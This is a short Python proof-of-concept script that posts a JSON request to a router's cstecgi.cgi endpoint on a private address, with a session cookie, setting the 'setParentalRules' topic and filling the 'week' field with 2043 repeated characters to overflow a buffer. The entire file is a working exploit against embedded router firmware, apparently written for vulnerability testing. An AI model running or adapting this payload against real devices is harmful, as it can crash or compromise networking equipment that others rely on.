import requests
from requests.exceptions import RequestException

url = "http://192.168.210.133:8080/cgi-bin/cstecgi.cgi"
cookie = {"Cookie": "SESSION_ID=2:1721039211:2"}
data = {
    "topicurl": "setParentalRules",
    "week": "b"*2043  # Reduced payload size for testing
}

try:
    # Added timeout and additional headers
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    }
    response = requests.post(
        url, 
        cookies=cookie, 
        json=data,
        headers=headers,
        timeout=10
    )
    print(response.text)
    print(response.status_code)
except RequestException as e:
    print(f"Request failed: {e}")